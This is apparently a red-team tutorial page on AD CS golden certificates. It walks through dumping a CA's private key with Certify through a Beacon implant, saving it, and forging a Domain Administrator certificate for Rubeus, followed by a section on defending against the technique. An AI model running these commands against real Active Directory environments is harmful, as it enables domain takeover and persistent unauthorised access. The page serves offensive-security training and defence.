---
title: "Golden Certificates"
date: 2026-09-25
weight: 2
type: docs
tags:
  - AD CS
  - Golden Certificate
  - DPERSIST1
  - Persistence
  - Active Directory
---

## Golden Certificates (DPERSIST1)

DPERSIST1 is a persistence technique that turns privileged access over a certificate authority into unrestricted privileged access across the whole domain. Once a CA server is compromised, an attacker can extract the public and private key pair the CA uses to sign and issue certificates. With that key in hand, certificates can be forged entirely offline and signed as though the CA itself had issued them. The parallel is the Kerberos `krbtgt` key, and that resemblance is exactly why these forged certificates are commonly called *golden certificates*.

The framing here is deliberately one of persistence, on the assumption that an organisation treats its CA servers as Tier 0 assets, held to the same standard as domain controllers. That said, if a CA is reachable through some weaker path, the same capability doubles as a privilege-escalation primitive.

## Extracting the CA key pair

With a Beacon running on the CA, confirm where you are and then use Certify to dump the CA key pair in PFX form:

```powershell
beacon> run hostname
hq-ca-01

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
[*] Action: Manage the current machine
[*] Attempting to dump a certificate from the certificate store.
[*] Certificate (PFX) - ARCADIA Root CA:

MIACAQ[...snip...]AAAAA=
```

Decode that blob and save the PFX to your own workstation so it is available for later use:

```powershell
PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\arcadia-root-ca.pfx", [Convert]::FromBase64String("MIACAQ[...snip...]AAAAA="))
```

## Forging a certificate

From here you can mint certificates on demand. The example below forges one for the built-in domain administrator, binding the identity through both the UPN and the SID:

```powershell
PS C:\Users\Attacker> C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\arcadia-root-ca.pfx --quiet --upn Administrator --subject CN=Administrator,CN=Users,DC=arcadia,DC=local --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=ARCADIA Root CA,CN=hq-ca-01,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=ARCADIA,DC=local
[*] Action: Forge a (golden) certificate

CA Certificate Information:
  Subject:        CN=ARCADIA Root CA, DC=arcadia, DC=local
  Issuer:         CN=ARCADIA Root CA, DC=arcadia, DC=local
  Start Date:     8/30/2025 11:19:40 AM
  End Date:       8/30/2125 11:29:39 AM
  Thumbprint:     73B4B551DB60427D0CBD5D2E2658BCB2088F3F2C
  Serial:         11138CE7C4FC0C9B4F805AC184522B2C

Forged Certificate Information:
  Subject:        DC=local, DC=arcadia, CN=Users, CN=Administrator
  SubjectAltName: Administrator
  Issuer:         CN=ARCADIA Root CA, DC=arcadia, DC=local
  Start Date:     2/28/2026 2:33:47 PM
  End Date:       2/28/2027 2:33:47 PM
  Thumbprint:     EBE370DFB276BEEB209D690EEC38DC6F36181638
  Serial:         6277C3E922A4E8DA7B0653FA05E9BA5F

Forged certificate (PFX):

MIACAQ[...snip...]AAAA==
```

The forged PFX then feeds straight into Rubeus' `asktgt` to obtain TGTs for the target user. It remains usable right up to its End Date unless it is manually revoked before then, so the longer the validity window you set, the longer the forged certificate survives as a persistence mechanism.

## Defensive considerations

Golden certificates are difficult to detect after the fact, because a forged certificate is signed by a legitimate CA key and never passes through the CA's own issuance pipeline, so there is no corresponding entry in the CA database or issuance logs to compare against. That places the emphasis firmly on protecting the key in the first place. Store CA private keys in a hardware security module so they cannot be exported by a compromised host, and hold CA servers to genuine Tier 0 standards: tight administrative access, aggressive patching, and isolation from lower-tier systems. Where a compromise is suspected, remember that revoking individual forged certificates is futile, since the attacker can simply forge more; the only durable remedy is to rotate the CA key pair, which invalidates every certificate the old key signed and is a significant undertaking. On the authentication side, certificate logons that map to highly privileged accounts are worth close monitoring, as is any unexpected access to the CA's certificate store.

## Further reading

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [GhostPack Certify](https://github.com/GhostPack/Certify)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)